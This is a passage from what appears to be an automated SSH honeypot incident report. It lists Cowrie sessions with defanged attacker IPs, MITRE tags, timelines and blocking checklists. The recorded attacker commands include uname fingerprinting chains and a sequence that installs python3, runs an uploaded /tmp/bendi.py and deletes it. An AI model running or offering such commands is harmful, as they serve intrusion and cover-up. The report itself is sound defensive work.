| `2026-07-26 06:08:36` | `cowrie.session.connect` |
| `2026-07-26 06:08:37` | `cowrie.login.success` |
| `2026-07-26 06:08:38` | `cowrie.session.params` |
| `2026-07-26 06:08:38` | `cowrie.command.input` |
| `2026-07-26 06:08:39` | `cowrie.command.input` |
| `2026-07-26 06:08:39` | `cowrie.command.input` |
| `2026-07-26 06:08:40` | `cowrie.command.input` |
| `2026-07-26 06:08:40` | `cowrie.command.failed` |
| `2026-07-26 06:08:41` | `cowrie.log.closed` |
| `2026-07-26 06:08:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]254` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4dae7436e2f8

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 06:09 |
| **Last Seen** | 2026-07-26 06:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 06:09:46` | `cowrie.session.connect` |
| `2026-07-26 06:09:46` | `cowrie.client.version` |
| `2026-07-26 06:09:46` | `cowrie.client.kex` |
| `2026-07-26 06:09:48` | `cowrie.login.success` |
| `2026-07-26 06:09:49` | `cowrie.session.params` |
| `2026-07-26 06:09:49` | `cowrie.command.input` |
| `2026-07-26 06:09:49` | `cowrie.command.input` |
| `2026-07-26 06:09:49` | `cowrie.command.input` |
| `2026-07-26 06:09:49` | `cowrie.command.input` |
| `2026-07-26 06:09:49` | `cowrie.command.input` |
| `2026-07-26 06:09:49` | `cowrie.command.success` |
| `2026-07-26 06:09:49` | `cowrie.command.input` |
| `2026-07-26 06:09:49` | `cowrie.command.input` |
| `2026-07-26 06:09:49` | `cowrie.command.input` |
| `2026-07-26 06:09:49` | `cowrie.command.input` |
| `2026-07-26 06:09:49` | `cowrie.log.closed` |
| `2026-07-26 06:09:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8f674ab1205

| Field | Detail |
|---|---|
| **Source IP** | `116.228.195[.]251` |
| **First Seen** | 2026-07-26 06:10 |
| **Last Seen** | 2026-07-26 06:10 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 06:10:38` | `cowrie.session.connect` |
| `2026-07-26 06:10:38` | `cowrie.client.version` |
| `2026-07-26 06:10:38` | `cowrie.client.kex` |
| `2026-07-26 06:10:40` | `cowrie.login.success` |
| `2026-07-26 06:10:41` | `cowrie.direct-tcpip.request` |
| `2026-07-26 06:10:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.228.195[.]251` to AbuseIPDB if not already reported
- [ ] Block `116.228.195[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-439f5266da2e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 06:11 |
| **Last Seen** | 2026-07-26 06:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 06:11:34` | `cowrie.session.connect` |
| `2026-07-26 06:11:35` | `cowrie.client.version` |
| `2026-07-26 06:11:35` | `cowrie.client.kex` |
| `2026-07-26 06:11:36` | `cowrie.login.success` |
| `2026-07-26 06:11:37` | `cowrie.session.params` |
| `2026-07-26 06:11:37` | `cowrie.command.input` |
| `2026-07-26 06:11:37` | `cowrie.command.input` |
| `2026-07-26 06:11:37` | `cowrie.command.input` |
| `2026-07-26 06:11:37` | `cowrie.command.input` |
| `2026-07-26 06:11:37` | `cowrie.command.input` |
| `2026-07-26 06:11:37` | `cowrie.command.success` |
| `2026-07-26 06:11:37` | `cowrie.command.input` |
| `2026-07-26 06:11:37` | `cowrie.command.input` |
| `2026-07-26 06:11:37` | `cowrie.command.input` |
| `2026-07-26 06:11:37` | `cowrie.command.input` |
| `2026-07-26 06:11:37` | `cowrie.log.closed` |
| `2026-07-26 06:11:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd4f74172c14

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 06:13 |
| **Last Seen** | 2026-07-26 06:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 06:13:26` | `cowrie.session.connect` |
| `2026-07-26 06:13:26` | `cowrie.client.version` |
| `2026-07-26 06:13:26` | `cowrie.client.kex` |
| `2026-07-26 06:13:27` | `cowrie.login.success` |
| `2026-07-26 06:13:28` | `cowrie.session.params` |
| `2026-07-26 06:13:28` | `cowrie.command.input` |
| `2026-07-26 06:13:28` | `cowrie.command.input` |
| `2026-07-26 06:13:28` | `cowrie.command.input` |
| `2026-07-26 06:13:28` | `cowrie.command.input` |
| `2026-07-26 06:13:28` | `cowrie.command.input` |
| `2026-07-26 06:13:28` | `cowrie.command.success` |
| `2026-07-26 06:13:28` | `cowrie.command.input` |
| `2026-07-26 06:13:28` | `cowrie.command.input` |
| `2026-07-26 06:13:28` | `cowrie.command.input` |
| `2026-07-26 06:13:28` | `cowrie.command.input` |
| `2026-07-26 06:13:28` | `cowrie.log.closed` |
| `2026-07-26 06:13:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc1f3efaf23b

| Field | Detail |
|---|---|
| **Source IP** | `195.222.57[.]190` |
| **First Seen** | 2026-07-26 06:15 |
| **Last Seen** | 2026-07-26 06:15 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 06:15:02` | `cowrie.session.connect` |
| `2026-07-26 06:15:02` | `cowrie.client.version` |
| `2026-07-26 06:15:02` | `cowrie.client.kex` |
| `2026-07-26 06:15:03` | `cowrie.login.success` |
| `2026-07-26 06:15:03` | `cowrie.direct-tcpip.request` |
| `2026-07-26 06:15:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.222.57[.]190` to AbuseIPDB if not already reported
- [ ] Block `195.222.57[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e35749ede17f

| Field | Detail |
|---|---|
| **Source IP** | `187.8.120[.]90` |
| **First Seen** | 2026-07-26 06:15 |
| **Last Seen** | 2026-07-26 06:15 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 06:15:08` | `cowrie.session.connect` |
| `2026-07-26 06:15:09` | `cowrie.client.version` |
| `2026-07-26 06:15:09` | `cowrie.client.kex` |
| `2026-07-26 06:15:11` | `cowrie.login.success` |
| `2026-07-26 06:15:11` | `cowrie.direct-tcpip.request` |
| `2026-07-26 06:15:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.8.120[.]90` to AbuseIPDB if not already reported
- [ ] Block `187.8.120[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-006a8dd36dfb

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 06:15 |
| **Last Seen** | 2026-07-26 06:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 06:15:14` | `cowrie.session.connect` |
| `2026-07-26 06:15:14` | `cowrie.client.version` |
| `2026-07-26 06:15:14` | `cowrie.client.kex` |
| `2026-07-26 06:15:15` | `cowrie.login.success` |
| `2026-07-26 06:15:17` | `cowrie.session.params` |
| `2026-07-26 06:15:17` | `cowrie.command.input` |
| `2026-07-26 06:15:17` | `cowrie.command.input` |
| `2026-07-26 06:15:17` | `cowrie.command.input` |
| `2026-07-26 06:15:17` | `cowrie.command.input` |
| `2026-07-26 06:15:17` | `cowrie.command.input` |
| `2026-07-26 06:15:17` | `cowrie.command.success` |
| `2026-07-26 06:15:17` | `cowrie.command.input` |
| `2026-07-26 06:15:17` | `cowrie.command.input` |
| `2026-07-26 06:15:17` | `cowrie.command.input` |
| `2026-07-26 06:15:17` | `cowrie.command.input` |
| `2026-07-26 06:15:17` | `cowrie.log.closed` |
| `2026-07-26 06:15:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-115de62ba9a5

| Field | Detail |
|---|---|
| **Source IP** | `82.102.149[.]88` |
| **First Seen** | 2026-07-26 06:15 |
| **Last Seen** | 2026-07-26 06:16 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 06:15:53` | `cowrie.session.connect` |
| `2026-07-26 06:15:54` | `cowrie.client.version` |
| `2026-07-26 06:15:54` | `cowrie.client.kex` |
| `2026-07-26 06:15:55` | `cowrie.login.success` |
| `2026-07-26 06:15:56` | `cowrie.direct-tcpip.request` |
| `2026-07-26 06:16:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.102.149[.]88` to AbuseIPDB if not already reported
- [ ] Block `82.102.149[.]88` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e57ae1493406

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 06:17 |
| **Last Seen** | 2026-07-26 06:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 06:17:01` | `cowrie.session.connect` |
| `2026-07-26 06:17:02` | `cowrie.client.version` |
| `2026-07-26 06:17:02` | `cowrie.client.kex` |
| `2026-07-26 06:17:03` | `cowrie.login.success` |
| `2026-07-26 06:17:04` | `cowrie.session.params` |
| `2026-07-26 06:17:04` | `cowrie.command.input` |
| `2026-07-26 06:17:04` | `cowrie.command.input` |
| `2026-07-26 06:17:04` | `cowrie.command.input` |
| `2026-07-26 06:17:04` | `cowrie.command.input` |
| `2026-07-26 06:17:04` | `cowrie.command.input` |
| `2026-07-26 06:17:04` | `cowrie.command.success` |
| `2026-07-26 06:17:04` | `cowrie.command.input` |
| `2026-07-26 06:17:04` | `cowrie.command.input` |
| `2026-07-26 06:17:04` | `cowrie.command.input` |
| `2026-07-26 06:17:04` | `cowrie.command.input` |
| `2026-07-26 06:17:04` | `cowrie.log.closed` |
| `2026-07-26 06:17:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b25399c4055b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 06:18 |
| **Last Seen** | 2026-07-26 06:18 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 06:18:46` | `cowrie.session.connect` |
| `2026-07-26 06:18:47` | `cowrie.client.version` |
| `2026-07-26 06:18:47` | `cowrie.client.kex` |
| `2026-07-26 06:18:48` | `cowrie.login.success` |
| `2026-07-26 06:18:49` | `cowrie.session.params` |
| `2026-07-26 06:18:49` | `cowrie.command.input` |
| `2026-07-26 06:18:49` | `cowrie.command.input` |
| `2026-07-26 06:18:49` | `cowrie.command.input` |
| `2026-07-26 06:18:49` | `cowrie.command.input` |
| `2026-07-26 06:18:49` | `cowrie.command.input` |
| `2026-07-26 06:18:49` | `cowrie.command.success` |
| `2026-07-26 06:18:49` | `cowrie.command.input` |
| `2026-07-26 06:18:49` | `cowrie.command.input` |
| `2026-07-26 06:18:49` | `cowrie.command.input` |
| `2026-07-26 06:18:49` | `cowrie.command.input` |
| `2026-07-26 06:18:49` | `cowrie.log.closed` |
| `2026-07-26 06:18:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00f6b2af419c

| Field | Detail |
|---|---|
| **Source IP** | `211.238.237[.]254` |
| **First Seen** | 2026-07-26 06:19 |
| **Last Seen** | 2026-07-26 06:19 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 06:19:19` | `cowrie.session.connect` |
| `2026-07-26 06:19:20` | `cowrie.client.version` |
| `2026-07-26 06:19:20` | `cowrie.client.kex` |
| `2026-07-26 06:19:23` | `cowrie.login.success` |
| `2026-07-26 06:19:24` | `cowrie.direct-tcpip.request` |
| `2026-07-26 06:19:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.238.237[.]254` to AbuseIPDB if not already reported
- [ ] Block `211.238.237[.]254` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd50c7c0c578

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 06:20 |
| **Last Seen** | 2026-07-26 06:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 06:20:28` | `cowrie.session.connect` |
| `2026-07-26 06:20:28` | `cowrie.client.version` |
| `2026-07-26 06:20:28` | `cowrie.client.kex` |
| `2026-07-26 06:20:30` | `cowrie.login.success` |
| `2026-07-26 06:20:31` | `cowrie.session.params` |
| `2026-07-26 06:20:31` | `cowrie.command.input` |
| `2026-07-26 06:20:31` | `cowrie.command.input` |
| `2026-07-26 06:20:31` | `cowrie.command.input` |
| `2026-07-26 06:20:31` | `cowrie.command.input` |
| `2026-07-26 06:20:31` | `cowrie.command.input` |
| `2026-07-26 06:20:31` | `cowrie.command.success` |
| `2026-07-26 06:20:31` | `cowrie.command.input` |
| `2026-07-26 06:20:31` | `cowrie.command.input` |
| `2026-07-26 06:20:31` | `cowrie.command.input` |
| `2026-07-26 06:20:31` | `cowrie.command.input` |
| `2026-07-26 06:20:31` | `cowrie.log.closed` |
| `2026-07-26 06:20:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cee03c6ff4b8

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-07-26 06:23 |
| **Last Seen** | 2026-07-26 06:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 06:23:03` | `cowrie.session.connect` |
| `2026-07-26 06:23:03` | `cowrie.client.version` |
| `2026-07-26 06:23:04` | `cowrie.client.kex` |
| `2026-07-26 06:23:04` | `cowrie.login.success` |
| `2026-07-26 06:23:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9379f68a67a5

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-07-26 06:23 |
| **Last Seen** | 2026-07-26 06:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 06:23:04` | `cowrie.session.connect` |
| `2026-07-26 06:23:04` | `cowrie.client.version` |
| `2026-07-26 06:23:04` | `cowrie.client.kex` |
| `2026-07-26 06:23:04` | `cowrie.login.success` |
| `2026-07-26 06:23:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e969b8506a4

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-07-26 06:23 |
| **Last Seen** | 2026-07-26 06:25 |
| **Session Duration** | 126s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 06:23:21` | `cowrie.session.connect` |
| `2026-07-26 06:23:21` | `cowrie.client.version` |
| `2026-07-26 06:23:21` | `cowrie.client.kex` |
| `2026-07-26 06:23:21` | `cowrie.login.success` |
| `2026-07-26 06:23:22` | `cowrie.session.file_upload` |
| `2026-07-26 06:23:23` | `cowrie.session.params` |
| `2026-07-26 06:23:23` | `cowrie.command.input` |
| `2026-07-26 06:23:23` | `cowrie.command.input` |
| `2026-07-26 06:23:23` | `cowrie.command.input` |
| `2026-07-26 06:23:23` | `cowrie.command.failed` |
| `2026-07-26 06:23:23` | `cowrie.log.closed` |
| `2026-07-26 06:23:23` | `cowrie.session.params` |
| `2026-07-26 06:23:23` | `cowrie.command.input` |
| `2026-07-26 06:23:24` | `cowrie.log.closed` |
| `2026-07-26 06:23:24` | `cowrie.session.params` |
| `2026-07-26 06:23:24` | `cowrie.command.input` |
| `2026-07-26 06:23:24` | `cowrie.log.closed` |
| `2026-07-26 06:23:25` | `cowrie.session.params` |
| `2026-07-26 06:23:25` | `cowrie.command.input` |
| `2026-07-26 06:23:25` | `cowrie.command.failed` |
| `2026-07-26 06:23:25` | `cowrie.command.failed` |
| `2026-07-26 06:24:26` | `cowrie.session.params` |
| `2026-07-26 06:24:26` | `cowrie.command.input` |
| `2026-07-26 06:25:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb377925e8a9

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-07-26 06:25 |
| **Last Seen** | 2026-07-26 06:27 |
| **Session Duration** | 126s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 06:25:42` | `cowrie.session.connect` |
| `2026-07-26 06:25:42` | `cowrie.client.version` |
| `2026-07-26 06:25:42` | `cowrie.client.kex` |
| `2026-07-26 06:25:42` | `cowrie.login.success` |
| `2026-07-26 06:25:43` | `cowrie.session.file_upload` |
| `2026-07-26 06:25:44` | `cowrie.session.params` |
| `2026-07-26 06:25:44` | `cowrie.command.input` |
| `2026-07-26 06:25:44` | `cowrie.command.input` |
| `2026-07-26 06:25:44` | `cowrie.command.input` |
| `2026-07-26 06:25:44` | `cowrie.command.failed` |
| `2026-07-26 06:25:44` | `cowrie.log.closed` |
| `2026-07-26 06:25:45` | `cowrie.session.params` |
| `2026-07-26 06:25:45` | `cowrie.command.input` |
| `2026-07-26 06:25:45` | `cowrie.log.closed` |
| `2026-07-26 06:25:46` | `cowrie.session.params` |
| `2026-07-26 06:25:46` | `cowrie.command.input` |
| `2026-07-26 06:25:46` | `cowrie.log.closed` |
| `2026-07-26 06:25:46` | `cowrie.session.params` |
| `2026-07-26 06:25:46` | `cowrie.command.input` |
| `2026-07-26 06:25:46` | `cowrie.command.failed` |
| `2026-07-26 06:25:46` | `cowrie.command.failed` |
